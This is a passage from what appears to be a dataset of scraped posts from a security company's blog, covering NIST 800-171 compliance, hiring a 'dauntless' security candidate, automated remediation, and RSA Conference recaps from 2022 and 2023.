Striking a balance between automation and human judgement is key to security operations. This is just one example of how we use automation here at Expel. Want to find out more about how we help our customers spot malicious attacks in PowerShell? Send us a note!'}) (input_keys={'title'}),
  Example({'title': 'Reaching (all the way to) your NIST 800-171 compliance ...', 'url': 'https://expel.com/blog/reaching-nist-800-171-compliance-goals/', 'date': 'Nov 29, 2018', 'contents': 'Subscribe  EXPEL BLOG Reaching (all the way to) your NIST 800-171 compliance goals Security operations  5 MIN READ  BRUCE POTTER  NOV 29, 2018  TAGS: Managed security / NIST / Overview / Planning / SOC If youre a U.S. Department of Defense (DoD) contractor or you do work with GSA or NASA, youre likely pretty familiar with NIST 800-171. If youre not a contractor subject to NIST 800-171, congrats, this is one security framework you DONT need to comply with. You can stop reading, grab a cup of coffee and focus on your NIST Cybersecurity Framework efforts instead. NIST 800-171 has technically been in force since the start of 2018. And while you had to be compliant at the beginning of the year, youre likely still looking to streamline your compliance and refine controls based on the evolving understanding of what NIST 800-171 means. Youre not alone, NIST even had a workshop on what Controlled Unclassified Information (CUI) in October. Given that protecting CUI is at the core of NIST 800-171, its safe to assume things will be dynamic for some time to come. A brief history of NIST 800-171 In a past life, I was the CISO for a DoD contractor. In particular, I was a CISO at a DoD contractor when the DFAR requirements were announced and we had to start preparing for compliance with NIST 800-171 by the end of 2017. I remember looking at 171 and thinking there were huge chunks of it that we, and most of our peers, had largely under control. Encryption requirements and other architectural security controls were well-traveled ground, and there were lots of vendors with well-tested products to close the compliance gap. But then there were other controls, particularly around monitoring and operations, that werent easily solvable with off-the-shelf products. The Defense Industrial Base (DIB), in general, went through a cybersecurity revolution in the early 2010s, after they were hit with a wave of targeted attacks. But there was still a long way to go. Their technology investments needed a commensurate investment in services and people. Thats easier said than done. If youve ever worked in a professional services company (including defense contractors), you know how hard it is to hire people that cant bill their time back to customers. Think IT, legal, finance and  oh yeah  security. Itd be easier to go climb Kilimanjaro to stand up a 247 SOC (If youd like more info on setting up your own SOC, as well as the costs and challenges associated with it, check out our blog post, How much does it cost to build a 247 SOC .) Understanding common NIST 800-171 compliance gaps Like it or not NIST 800-171 spells out a number of operational controls, which are hard to put in place without old-fashioned human beings. And youve got to have these controls in place to get your compliance crown (and pass your audit with flying colors). Most of them relate to monitoring. They include: Procedure Security requirement 3.1.12 Monitor and control remote access sessions 3.3.3 Review and update logged events 3.3.5 Correlate audit record review, analysis, and reporting processes for investigation and response to indications of unlawful, unauthorized, suspicious, or unusual activity All of section 3.6 Incident response 3.14.3 Monitor system security alerts and advisories and take action in response 3.14.6 Monitor organizational systems, including inbound and outbound communications traffic, to detect attacks and indicators of potential attacks 3.14.7 Identify unauthorized use of organizational systems The details of each section are different, but the overall gist of all of these requirements is the same; you need someone to monitor your systems to look for bad things, respond to the bad things and then report on the bad things. The challenge for many organizations is the someone part. Identifying who exactly is going to monitor, respond and report often leads to a bunch of dead ends. While its possible to automate a few things with some scripts and shoot texts and emails to IT staff at all hours of the night, thats not really satisfying (or sustainable). From a compliance perspective, that kind of solution is riding the edge of auditor acceptability. Worse, if you stumble into a reportable incident and your client comes looking to see what happened, solutions like scripts and late-night emails arent going to be satisfying to them either. Theyre going to wonder why nobody was looking. Closing your compliance gaps without building a SOC If youre at a professional services company that does government contracting, youve made responsible investments in security technology and youre staring at the 247 monitoring requirements in section three of NIST 800-171 wondering what to do, youre in good company. Building a security operations center (SOC) and hiring a bunch of SOC analysts is about as likely as getting a sole source contract to run every federal network at every agency. So what should you do to get compliant? By offloading your security operations to an MSSP, you can address the operational needs of 800-171 relatively quickly. The most obvious place to look is at managed service providers. By offloading your security operations to an MSSP or a managed detection and response (MDR) provider, you can address the operational needs of NIST 800-171 relatively quickly. Nine times out of . nine its generally easier to sign a service contract that it is to build your own SOC. But choosing a provider isnt always straightforward. Not all MSSPs and MDRs are created equal, and there are warning signs that an MSSP may not be right for you. However, while were admittedly a little biased, we feel that Expel is a great fit for organizations that are trying to get operational support for their NIST 800-171 needs. Heres why. We use your existing security technology Unlike many other MSSPs and MDRs, we meet our customers where they are. We dont require you to use a specific endpoint product or a specific SIEM (or even have a SIEM in the first place). We use what you use. Expel supports a large number of security vendors already, and if you use a technology we dont yet support, lets chat and see if we can integrate with it. Youve made your investment in security technology. Let us help you realize more value from that investment. We provide answers, not alerts Its a little cliche, but its really the words we live by here at Expel. When our analysts investigate something and notify you about an incident, its actually something you can transact on. Put another way  wont have to do your own analysis to figure out if its a real alert or determine what the impact might be. We do that for you. Further, we provide you with specific steps you need to take to remediate the issue. Really, you dont need to think much about your security operations unless we notify you. And when we notify you, youll be well armed to deal with the issue at hand. Onboarding is wicked fast! Some MSSPs and MDRs require weeks to months to onboard new customers. There may even be a professional services team that shows up to help the process. Here at Expel, weve been focused on making onboarding as easy as possible from day one. We send you a VM, you install it, and then you provide API keys for your various security technologies. We take it from there. Onboarding with Expel is usually measured in hours, with our customers seeing tangible value within the first few days. If you feel like you have a compliance gap you need to close, we can help you close it as fast as youre willing to move. The price is straightforward pricing Life is too short to spend running around and around with a vendor about pricing. Ive sat through enough color team meetings and responded to enough RFPs to know how valuable time is (and how infuriating wasted time can be). Here at Expel, weve made our pricing straightforward. No hidden costs, no last minute oh, thatll be extra. We collect all the info we need up front to quickly give you the complete breakdown you need. That should make your procurement people happy, which in general makes everyone happy. Were happy to chat about NIST 800-171 compliance and our service offerings . Were security nerds like that.'}) (input_keys={'title'}),
  Example({'title': 'Recruit for team dauntless', 'url': 'https://expel.com/blog/recruit-team-dauntless/', 'date': 'Oct 25, 2017', 'contents': 'Subscribe  EXPEL BLOG Recruit for team dauntless Talent  3 MIN READ  YANEK KORFF  OCT 25, 2017  TAGS: Employee retention / Great place to work / Hiring / Management I was interviewing a not-very-experienced candidate recently. Shed had a number of internships in a variety of technical disciplines, but this was her first full-time role. As I do with many entry-level candidates, I asked whats known as the what happens when question : Question 1 Imagine youre at your computer, you type www.expel.io into your web browser and hit enter. Tell me, in as much technical detail as you can, what happens next for that page to load. Its a great assessment question. Its relatively hard to study for because, as an interviewer, you can keep asking more detailed questions to see where a candidates technical depth bottoms out. The candidate cant really fully prepare for all the directions this conversation can go. This isnt a game of stump-the-candidate, but instead a way for an interviewer to assess both the breadth and depth of a candidates technical knowledge in this area. Our candidate did okay. Her fluency jumping around the OSI reference model implied a pretty good understanding of the network encapsulation and decapsulation process. She hit a lot of the right keywords with respect to HTTP and DNS at layer 7. She covered the handshake aspects of TCP. She even drilled down a bit into layer 2 and was able to articulate how to effectively manage a collision domain. Where things went a little bit sideways was around DNS itself. Whether it was nerves or otherwise, she seemed to struggle separating what was happening in the routing of DNS requests from the contents of those requests and the records that would need to be returned to the DNS queries sent. Overall, the candidate did well given her experience. She demonstrated a sufficient depth of knowledge that implied shed be able to learn what comes next. After all, without a strong technical foundation, you cant learn security. Your knowledge of how things work at a fundamental level forms a sort of backbone or framework onto which you can attach new things you learn. Whats more, the volume of new things you learn every day in a security role is so high, its essential to find people who have a genuine thirst for this knowledge. Some might say candidates have to be really passionate about it . Question 2 Tell me about a time at work, or a project at school that thinking back to it, you say to yourself, If I could do that every day it was so much fun, that would be amazing. What was this work or project? What made it so great? Turns out, in her most recent internship, our candidate ended up solving a problem that users were having with attachments in Office 365. The process of individually downloading attachments was so cumbersome, people had written their own macros that would automatically download attachments directly to their desktop. Needless to say, the security team wasnt excited about the proliferation of homegrown macros combined with auto-downloads. So, the candidate dove into this problem and built a centralized capability using PowerShell and .NET that provided a safe means of retrieving, scanning, and depositing these attachments in a company-managed file share that met both the security teams needs and the needs of their user base. Nice work! Whats most interesting is the reason this was her favorite work experience. Its multi-faceted. Not only did she enjoy solving a real problem that impacted users, shed never worked with PowerShell or .NET before. Nor had she written anything to interact with Office 365. All in all, it was a tremendous learning experience. Deriving so much pleasure (remember, this was her FAVORITE work experience) from learning new stuff certainly implies the kind of fearlessness that  Team Dauntless  might imply. Still, lets ask one more question. Question 3 What prompted you to take on this project? Well our candidate was hired into a security team that hadnt had an intern before. They were unprepared. It became quickly clear that there werent any clear tasks for her to take on. So, in the absence of guidance she started talking to the members of the team about problems they were facing to get a better lay of the land in search of problems she thought she might be able to take on. As this particular problem emerged, she started brainstorming with members of the team how it might be solved. PowerShell arose early as a potential vector for a solution, so she taught herself over the course of a couple weeks. As more nuanced needs arose, she continued to seek guidance from more senior members of the team and, coupled with her own independent research, eventually arrived at the solution she finally rolled out. The textbook definition of dauntless is fearlessness and determination. I cant think of a story that better exemplifies these behaviors in a candidate and Im really looking forward to this particular candidate joining our team. When youre interviewing the next member of your security team  consider this question. Do they display the qualities of fearlessness and determination that will drive them to achieve great things in your organization? Look for this, and you wont be disappointed with the outcome.  This is the fourth part of a five part series on key areas of focus to improve security team retention.Read from the beginning, 5 ways to keep your security nerds happy , or continue to part five .'}) (input_keys={'title'}),
  Example({'title': 'Remediation should be automatedand customized', 'url': 'https://expel.com/blog/remediation-should-be-automated-and-customized/', 'date': 'Oct 13, 2022', 'contents': 'Subscribe  EXPEL BLOG Remediation should be automatedand customized Security operations  3 MIN READ  PETER SILBERMAN  OCT 13, 2022  TAGS: MDR Here at Expel, we talk an awful lot about remediation, and with good reason: effective remediation of cybersecurity incidents is critical for our customers business and our own. Getting to the fix quickly is fine, but when done properly, the organization realizes a host of additional benefits. Customer control During an active incident, remediation reduces an organizations risk, but customer control of that process is absolutely essential. Its also important to understand that remediation isnt all-or-nothing. Many providers in the marketplace sell a cookie-cutter, full-remediation approach, but organizations should have the option to provide context specific to their business, technology, risk tolerance, policies, and general comfort level, allowing them to dictate when to remediate and when not to. (Any number of factors can contribute to that comfort zone, including internal policies, familiarity with the vendor, lingering aches and pains from bad past experienceswe get it. For example, you dont want a third party to isolate hosts during an incident? Thats fine. A good provider can still disable compromised user accounts without isolating hosts.) The platform itself should know the rules and preferences of the customer; this ensures consistency and scale and ensures security operation center (SOC) analysts dont have to pass around sticky-notes reminding them to remediate a certain way for customer A, but not customer B, for example. A security operations platform thats context-aware and customizable allows the client organization to: Reduce risk by allowing automated remediation steps the moment an issue is detected; Reduce fatigue and burnout (why wake a customer analyst at 2 am to disable an account when the system can do it for you?); and Keep customer analysts focused on more important workwhat does the business deem important? Automated remediations breathtaking benefits In our Quarterly Threat Report for Q2 , we noted that the median time to complete a non-automated remediation action was two hours. When automated, the median time drops to seven minutesa 1640% improvement. Regardless of whether they opt for automated remediation, organizations should insist on comprehensive reporting that includes remediation steps as part of the investigative process. Vendors can (and should) always recommend remediation actions, even if that vendor isnt going to take the steps themselves. A deeper look at the numbers suggests the benefits of automated remediation may be even greater for the customer. In Q2 2022: We had 3,378 remediation actions (RA) that were manual. ~30% of incidents had more than one remediation action , compounding the time savings. Lets take a look at what autoremediation looks like in our Workbench environment. Heres what it looks like in Slack: Many actions can be automated, including (but not limited to) host containment, disabling a user account, removing suspicious emails, or blocking a known bad hash. Customers can also decide what resources Expel can remediate on their behalf. As mentioned above, this is far from a cookie-cutter approach. Raspberry Robin/Evil Corp incident: huge time savings Raspberry Robin, a widespread USB-based worm that acts as a loader for other malware, has significant similarities to the Dridex malware loader, meaning that it can be traced back to the sanctioned Russian ransomware group Evil Corp. (Source: DarkReading ) This past June a CrowdStrike alert hit our queue that related to msiexec launching with unusual arguments on a customer host. Our team identified this as activity consistent with the installation of a variant of the Raspberry Robin Worm malware family attributed to Evil Corp. Using CrowdStrikes APIs, it took our analysts 5.5 minutes to progress from the alert hitting the queue to containing the host and stopping the ransomware. When the stakes are high, theres no time to waste in remediating. Autoremediation: its your call Automated remediation should be tailored to your organization and based on the frequency of threats seen in your environment. The customer decides which users and endpoints should be immediately taken offline after a compromise is confirmed. This allows the security team to focus on other initiatives instead of spending a ton of time on remediation. As businesses think about managed detection and response (MDR) and reducing risk, considering offloading some of this costly work to a trusted provider is hopefully front-of-mind. Its also useful to understand the unique context of the organization, which includes business goals, existing technology, even corporate culture, and to talk with your provider about it. Want to learn more about Expels approach to automated remediation? You can read more about it here .'}) (input_keys={'title'}),
  Example({'title': 'RSA Conference Day 2: Inclusivity is the Goal', 'url': 'https://expel.com/blog/rsa-conference-day-2-inclusivity-is-the-goal/', 'date': 'Jun 8, 2022', 'contents': 'Subscribe  EXPEL BLOG RSA Conference Day 2: Inclusivity is the Goal Expel insider  2 MIN READ  ANDY RODGER  JUN 8, 2022  TAGS: Cloud security / Company news / MDR / Tech tools Day two of RSA Conference is now in the rearview. We heard about nations around the world that present significant cyber threats and learned how the security operations center (SOC) is moving to be more autonomous. We also got some clarity on a few hot-button topics, like cryptocurrency, non-fungible tokens (NFTs), quantum computing, machine learning (ML), and artificial intelligence (AI) from the esteemed participants of the Cryptographers Panel. But one session was particularly notable for Expletives and our customers alike, and that was Innovation, Ingenuity, and Inclusivity: The Future of Security is Now , presented by Vasu Jakkal, Corporate Vice President for Microsoft Security, Compliance, Identity Management and Privacy. In cybersecurity, we try to balance our time between considering the threats and attack strategies most likely to impact us today, while also looking ahead to the potential attacks of the future. Jakkals perspective is that the threats of tomorrow exist today; theyll simply be more pervasive tomorrow. To stay ahead of this evolution, the industrys collective approach must also evolve. How? Through technological innovation, human ingenuity and expertise, andarguably most importantlyinclusivity in our defender community. Its no secret that the cybersecurity industry struggles with attracting and retaining talent. Jakkal shared a few statistics: 1 in 3 security jobs in the US is vacant 24% of the global cybersecurity workforce is made up of women 20% of the global cybersecurity workforce is made up of people of color One way to overcome this challenge, Jakkal argues, is to create a more inclusive environment where people from many different backgrounds are empowered to do their best work and thrive. This is a sentiment we echo at Expel. We know were better when different. Were a stronger organization when we recognize, celebrate, and learn from those whose backgrounds and perspectives are different from our own. Were committed to creating a safe place where any form of racism and discrimination is addressed and dismantled so everyone is treated with kindness and equality. This is rooted in our core belief that if we take care of our crew, theyll take care of our customers. Were on a journey to hire and develop people from underrepresented groups  Women, Black, Latinx, Indigenous, Multiracial, LGBTQ+, People with Disabilities, and Veterans  and to create a company thats as diverse as the countries in which we work and live. (By the way, were hiring .) Jakkal offered up some of her own ideas for breaking down the barriers of entry to the defender community (and we couldnt agree with these more): Eliminate college degree and length of experience requirements for defenders Mobilize community colleges to help grow and diversify our workforce Change the language of cybersecurity to be about optimism and hope, rather than fear, uncertainty, and doubt (FUD) Throughout her session, Jakkal presented a number of great ideas and concepts that we feel all cybersecurity organizations should research and implement. But there was one line she said in passing that was, to us, the most important takeaway for the audience: Cybersecurity is for everyone. Its a simple phrase, but a powerful one. If youd like to learn more about how Expel practices equity, diversity, and inclusion on a day-to-day basis, visit this page .'}) (input_keys={'title'}),
  Example({'title': 'RSA Conference day 2 recap: generative AI emerges as ...', 'url': 'https://expel.com/blog/rsa-conference-day-2-recap-generative-ai-emerges-as-the-events-unofficial-theme/', 'date': 'Apr 26, 2023', 'contents': 'Subscribe  EXPEL BLOG RSA Conference day 2 recap: generative AI emerges as the events unofficial theme Expel insider  2 MIN READ  ANDY RODGER  APR 26, 2023  TAGS: Company news Stronger Together may be the official theme of RSA Conference 2023, but generative artificial intelligence (AI) has officially emerged as the unofficial theme this year. Conference sessions from keynotes to breakouts alike all seem to include some reference to generative AI (specifically ChatGPT) and the impact it could have on cybersecurity. While some talks showcase the forms it could takelike how RSA CEO Rohit Ghai introduced a generative AI during his keynote and asked it what a unified identity platform should include, or Trellix CEO Brian Palma kicking off his presentation with a deepfake doppelganger demanding a ransom speaking fee to appear liveother talks examined how AI is a two-sided coin. One side shows the havoc AI could wreak, and the other takes a more hopeful tone, focusing on how defenders can wield it for good. In the panel, Who Says Cybersecurity Cant Be Creative? , Daniel Trauner of Axonius regularly uses AI to get insights about the audiences his content will reach so he can better tailor his content and messages. In the same session, Chris Cochran of Hacker Valley Media said he uses ChatGPT to simplify complex topics for his podcast and web series audiences. Despite generative AI staking a claim for the unofficial theme of RSA Conference 2023, Vasu Jakkal of Microsoft Security masterfully combined the AI topic with the Stronger Together ethos in her presentation, Defending at Machine Speed: Technologys New Frontier . (Eagle-eyed readers may remember that we highlighted one of Jakkals presentations in our RSA Conference recaps in 2022, found here .) Like many other speakers, she argued that in cybersecurity, the concern shouldnt be about what technology can do but rather what people can accomplish when they harness technology. Jakkal provided the crowd with a brief history lesson on industrial revolutions, starting with the invention of the steam engine in 1750 and culminating in the AI revolution that started in 2022and has accelerated since. Jakkal argued that this acceleration means 2023 represents an inflection point for AI, but achieving security-specific AI requires the combination of AI, hyperscale data, and threat intelligence. The resulting security-specific AI models will tilt the scale in favor of defenders. But how? First, it will simplify the art and science of defending. AI will handle a lot of the repetitive, manual tasks often assigned to \u200clevel 1 security operations center (SOC) analysts. Frankly, this was refreshing to hear. Not only is it good news for SOC teams, but its also something we at Expel have been saying for some time (and doing with our friendly detection and response bots, Josie and Ruxie). Our founders started Expel with the goal of solving people challenges with a technology-forward approach. Next, AI will shape a new paradigm of productivity. It will help usher in new generations of talent into the cybersecurity workforce, and it will help guide people on their learning paths, allowing them to uplevel their skills. This could provide much-needed relief for the well-known cybersecurity talent gap. Finally, and perhaps most importantly, AI has the potential to break barriers for diversity and inclusion in security. When applied correctly, it provides equity and gives everyoneregardless of their differencesthe same access to information to help them do their jobs effectively. Jakkal cautions, however, that this doesnt happen by accident. If AI is exposed to only certain sources of information, it will incorporate unconscious bias into its answers. So the cybersecurity community must make a real effort to encourage diverse use of the tool. She encouraged everyone to engage and prompt these large language models (LLMs) to ensure the community feeds it a diversity of thoughts and experiences. Jakkal ended her presentation pointing out that AI has the potential to be the most consequential technology of our lifetimes, but it will need all of us to make it stronger, together.'}) (input_keys={'title'}),
  Example({'title': 'RSA Conference Day 3: Impressions From the Show Floor', 'url': 'https://expel.com/blog/rsa-conference-day-3-impressions-from-the-show-floor/', 'date': 'Jun 9, 2022', 'contents': 'Subscribe  EXPEL BLOG RSA Conference Day 3: Impressions From the Show Floor Expel insider  3 MIN READ  ANDY RODGER  JUN 9, 2022  TAGS: Cloud security / Company news / MDR / Tech tools As the largest cybersecurity event in the world, RSA Conference serves up an agenda that provides something for everyone. No matter what cybersecurity area an attendee is interested in, theres likely to be a keynote or session that addresses it, as well as at least a handful of vendors competing in that area. The wide range of topics covered at a show like RSA Conference makes it nearly impossible for a single theme to rise above the rest and be the talk of the show. So we talked to a few folks whove spent time on the show floor about the things theyve found most interesting, and the trends theyre paying the most attention to at this years conference. Heres what they had to say: Whats the most interesting thing youve noticed from the show floor? The main thing is that the human connection is more apparent and more visceral than I was expecting. Ive been coming to RSA Conference for a while, and normally its the standard thing: youre an agent of the company, talking to another person whos an agent of the company, and theres a lot of synergies being leveraged and corporate speak, and everyones wearing a blazer Thats kind of hollow. But then you go away for a few years and realize you actually miss these people and the human connection comes back. Im seeing old friends, and it puts a whole different spin on whats going on here  which is super cool.  Matt Peters, Chief Product Officer of Expel Im happy to be back in person because of how small and tight-knit the security industry is. Its fun seeing everyone again.  Chris Dobrec, Vice President of Solutions for Armis ( a partner of Expel ) To be honest, the number of participants. I was a bit skeptical of the turn-out and Im pleasantly surprised that I was completely wrong about it. And more importantly, the folks that are showing up  even though the numbers are not as high as theyve been in the past  are coming in with very specific questions and interests. So the quantity may not be there, but the quality is.  Oscar Miranda, Field Chief Technology Officer of Healthcare for Armis One thing that stands out is the size of this conference. Its very obvious that this is a booming space, and theres so much opportunity for companies to do well in niche markets. Whether its one specific supply chain area or workload protection, whatever, theres something for everybody here.  Adam Mikula, Sales Development Team Lead for Aqua Security Whats a trend you find most compelling from this years conference? I think that the XDR [extended detection and response] trend is compelling Not because XDRs a new thing, but I think everyone is waking up to a fundamental concept about the way that security works. When theyre talking about XDR, people are talking about the ability to do high-quality response  stitching together a whole bunch of things and actually empowering people to do high-quality investigations. As long as the vendors dont grab that and change it to suit their own purposes, I think the result will be improved security technology.  Matt Peters From a technology perspective, [Im seeing] the emphasis on risk, the emphasis on threat detection and response, different categories starting to come together  like XDR coming together as an amalgamation of endpoint security and SIEM, and a whole variety of things, to be a wholesale offering. Thats starting to deliver on the promise (so-to-speak) that weve been talking about with XDR for a long time.  Chris Dobrec Theres a lot of consolidation, starting with overlap. A lot of these vendors  no matter what particular area within cybersecurity theyve traditionally been focused on  have expanded their functionality, which I predict is going to result in more consolidation amongst vendors and platforms. So, functionality that you would normally see in one type of technology, now youre going to see it across others.  Oscar Miranda Supply chain and shifting even further left has been a pretty consistent message. Attackers are getting smarter and code is getting even more complicated. You want to figure it out early, secure it early, and prevent it early, so you dont have problems later on.  Adam Mikula From these conversations, it sounds like XDR is now a part of the vernacular that isnt going away  its time to get comfortable with what it means for both individual organizations, and the industry as a whole. Another undeniable theme? People are happy to be back in person, swapping stories and lessons learned with friends; old and new. We still have some fun planned as we head into the home stretch of the conference. Stop by our booth (S649) for pics with our friendly bots, Josie and Ruxie, and load up on swag (if you still have room); well see you there .'}) (input_keys={'title'}),
  Example({'title': "RSA Conference day 3 recap: we're solving people problems", 'url': 'https://expel.com/blog/rsa-conference-day-3-recap-were-solving-people-problems/', 'date': 'Apr 27, 2023', 'contents': 'Subscribe  EXPEL BLOG RSA Conference day 3 recap: were solving people problems Expel insider  2 MIN READ  ANDY RODGER  APR 27, 2023  TAGS: Company news Whether RSA Conference 2023 attendees know it or not, weve come together this week to solve people problems. Its easy to think of cyber criminals as a faceless, nebulous mass, but in reality theyre just people using technology for nefarious means. The millions of open cybersecurity positions signal recruiting shortcomings and lack of clarity for people who might be interested in security careers. Artificial intelligence (AI) is on everyones mind, but even that conversation focuses on how generative AI brings people closer to technology than previously imaginable. At the core, these are people problems. No matter the session topics or the booth messaging, many RSA attendees aim to arm defenders with the resources they need to protect their orgs and customers from cyberthreats. But what are those resources? The first answer that comes to mind might be new tools, or more advanced technology, but the right answer is teamwork. No matter what technology we use, we cant protect our organizations alone. It takes a village. Many sessions throughout this years program focused on exactly this. When the CISOs of the NBA, NHL, and NFL joined a panel to discuss how they protect major sports leagues and high-profile athletes, they emphasized how they collaborate and share their challenges, best practices, lessons learned, and actual security intelligence. According to Ahmed Al Hammadi of the National Cybersecurity Agency in Qatar, securing the 2022 FIFA World Cupthe largest sporting event in the worldwas only possible through close collaboration between the Qatari government, cybersecurity and technology consultants, vendors, and other subject matter experts. He emphasized the importance of public-private partnerships to defend against cyber attacks related to these events, and, in the same vein, he committed to working closely with the 2026 event organizers when its held in North America. In their outstanding session, Strengthening Cybersecurity Through Inclusion , Camille Stewart Gloster of the White House Office of the National Cyber Director and Rob Duhart, Jr. of Walmart, talked about how security teams need to comprise diverse voices and backgrounds. They noted, diversity is a deterrent, and we underestimate the adversary when we build homogenous teams. Even the sessions that werent all about security stressed the importance of community and collaboration. Eric Idle of Monty Python fameafter admitting that he knows nothing about securitynoted that the five members of the troupe wrote every word for their shows, movies, albums, and more. He said that while the different members would go off and write in small groups, theyd come together to present their ideas to the whole group, and if everyone laughed, they used it. He even talked about how George Harrison of The Beatles financed the production of Monty Pythons The Life of Brian after initial funding was pulled. Harrison mortgaged his home for the cash needed to make the movie. Sometimes, even Monty Python needs a little help from their friends. (Sidebar: when Idle asked Harrison why he wanted to pay for the production, Harrison simply told him that he wanted to see the movie.) We all need the support of the community if were going to win this cybersecurity battle. We can solve the shortage of cybersecurity talent, figure out the best ways to apply generative AI, and build diverse teams better equipped to fight the good fight. But theres only one way forward to solve the most important challenges facing our industry, and thats together.'}) (input_keys={'title'}),
  Example({'title': 'RSA Conference keynote kickoff: what it means to be  ...', 'url': 'https://expel.com/blog/rsa-conference-keynote-kickoff-what-it-means-to-be-stronger-together/', 'date': 'Apr 25, 2023', 'contents': 'Subscribe  EXPEL BLOG RSA Conference keynote kickoff: what it means to be Stronger Together Expel insider  2 MIN READ  ANDY RODGER  APR 25, 2023  TAGS: Company news Perhaps more than any other industry, the world of cybersecurity requires community . Much ink (real and digital) has been spilled on this notion since the dawn of the space, as companies and individuals realized early on theyd need to take special care to protect their vital assets in the cyber realm. Fighting cybercriminals takes everyonedefenders, leaders, vendors, partners, competitors, frenemies, rivals, and, well, everybody coming together to combat those that mean us harm, whether its for financial gain, IP theft, espionage, sowing chaos, or just for mischief. This community convenes this week in San Francisco for RSA Conference 2023 , and its events like these that demonstrate the strength of this community. Its here that we share what weve learned about the trends, technologies, and techniques that had the greatest impact in the previous year, as well as whats poised to affect us most in the year ahead. The Stronger Together theme of this years conference is front-and-center. But the mission runs much deeper than the signs around the Moscone Center and the slide decks on stageits evident in the programming, too. The agenda features a wide range of technical sessionsof coursebut it also features sessions on diversity and growing the cybersecurity workforce, both in size and experience. It includes the latest on perennial favorites like hacking tactics and incident response, as well as emerging ones, like the potential impact of artificial intelligence (AI) for criminals and defenders alike. So when the lights dimmed and the music started to introduce the keynote, it wasnt surprising to hear a voiceover reminding us that, We are more than an industry. We are a community. No matter where you are in the world, were always here to welcome you home. This theme was also reflected in the opening to the keynote, delivered by Saturday Night Live legend and Portlandia star, Fred Armisen. He got the crowd laughing and heads bopping with his take on guitar music genres and lyrical styles from the 60s through the early 2000s. But when he got the crowd to its feet to sing along to All You Need Is Love by The Beatles, the idea of being stronger together really started to coalesce. Following Fred Armisen is no easy feat, but RSA Conference program committee chair Hugh Thompson delivered. He reminded the crowd that this event is about the fellowship among others that face the same challenges, and were all here to build bridges and connections. He reminded us that when we chose a career in cybersecurity, we also committed to being life-long learners. Our adversaries are just as creative, smart, and well-resourced as we are, so we must constantly learn to stay ahead. This challenge is particularly important in the field of science and technology. Thompson very aptly noted that when advancements emerge, they shine a bright light. This light represents an opportunity, but it also casts a shadow in which our adversaries operate. But thats okay. Were shadow experts. We know where to look, where to shine more light, and how to expose attackers and their tactics. Thompson only held the stage for a few brief minutes, but his message was clear: were a community, and together well emerge victorious. If youre interested in learning about Expels role in the cybersecurity community, visit us in the South Hall of the Moscone Center, booth 0954. And be sure to follow us on LinkedIn and Twitter , where were posting frequent updates about our booth happenings and what were hearing in sessions.'}) (input_keys={'title'}),
  Example({'title': 'RSA Conference Returns: Day 1 Keynote Summary', 'url': 'https://expel.com/blog/rsa-conference-returns-day-1-keynote-summary/', 'date': 'Jun 7, 2022', 'contents': 'Subscribe  EXPEL BLOG RSA Conference Returns: Day 1 Keynote Summary Expel insider  3 MIN READ  ANDY RODGER  JUN 7, 2022  TAGS: Cloud security / Company news / MDR / Tech tools The moment weve been waiting for is here! RSA Conference is back, live and in-person. While you can correctly point out that the conference never really went awayit was a virtual event in 2021many folks in our industry would agree that it just wasnt the same. Albeit with smaller crowds than pre-pandemic years and four months later than originally scheduled, its great to be back and the energy is high. RSA picked Transform as its theme for this years event. Its rather apropos considering the state of our industry, our workforce, security technologies, the threat landscape, and the very nature of this event. It seems that every year represents a turning point for the world of cybersecurity, and 2022 is no different. The keynote speakers who kicked off the 2022 event were all inspiring and hopeful for the future of the security space. But before they came out, the crowd was treated to a special performance You know something special is about to happen when a beatboxer kicks off a conference. And when that beatboxer is followed by the rest of her group, Freestyle Love Supreme , the energy gets amped way up! Side bar: If you missed out on the keynote (or you just cant get enough), were hosting freestyle rapper and YouTube sensation, Harry Mack , at our booth (S649) on Tuesday, June 7, at 11 am, 2 pm, and 5 pm PT. (Great minds think alike, @RSAC!) Rohit Ghai, the CEO of RSA, bravely took the stage following the special act for the opening keynote. His address, titled, The Only Constant, examined the cybersecurity industrys experience in shaping transformational shifts that will determine the next normal. He discussed how the world has been living with disruption, like the pandemic and the conflict in Ukraine, and explored how physical disruption can create digital ripplesand vice versa. (We all remember how the Colonial Pipeline cyberattack resulted in long lines at the gas pump.) According to Ghai, the Ukrainian hacker army is three times the size of Ukraines actual military force. Ghai pointed out that we are moving towards a more hyperconnected world where the physical and digital realms are indistinguishable, and where were going to need to know how to deal with a torrent of global disruptions. He ended his address on an encouraging note, stating, This is our story. Lets not allow anyone else to write it. Ciscos EVP and GM of security and collaboration, Jeetu Patel, and SVP and GM of Ciscos security business group, Shailaja Shankar, took to the stage next to ask, What Do We Owe One Another in the Cybersecurity Ecosystem? Patel outlined three trends that Cisco is hearing from their 300,000+ customers: Businesses are competing as ecosystems, rather than as individual entities, Everyone is an insider, and can be considered a potential threat, and Hybrid work is here to stay. Patel believes that security resilience is the key for organizations faced with these significant cybersecurity challenges. Shankar then described an issue that compounds these potential threats; a concept shes termed the Security Poverty Line. This is the baseline security posture companies need to deal with cyber threats. Getting companies above this poverty line, Shankar argued, requires more than information sharing and volunteering to help smaller or struggling organizationsit means truly investing in their security capabilities and even sharing the security risk they might encounter. Tom Gillis, VMwares SVP and GM of networking and advanced security business group, took to the stage next to reframe our thinking away from separating on-premises, private cloud security from public cloud security. He instead advocated for separating security between traditional virtualized applications and Kubernetes applications. It was an interesting shift in perspective on the usual borders that separate security strategies. Lastly, the microphone passed to Michele Flournoy, the co-founder and managing partner of WestExec Advisors and Avril Haines, the director of national intelligence, and the first woman to hold the job. The conversation tackled Rethinking the Cybersecurity Challenge From an Intelligence Community (IC) Perspective, and how the intelligence community is collaborating with industry and international partners to rethink how we design networks, and the cybersecurity that protects them. One common thread across the keynote speakers was a hopeful, uplifting, and encouraging tone. Too often in our industry, companies use fear, uncertainty, and doubt to get their points across and compel action. Today, the keynotes centered on how we, as an industry, can pull together to change the world for the better. Well be on the showfloor at booth S649 in the South Hall all week! Stop by to say hi, book a meeting or schedule a demo , and keep an eye out for more daily recaps of our time at Mosconejust like this one.'}) (input_keys={'title'}),
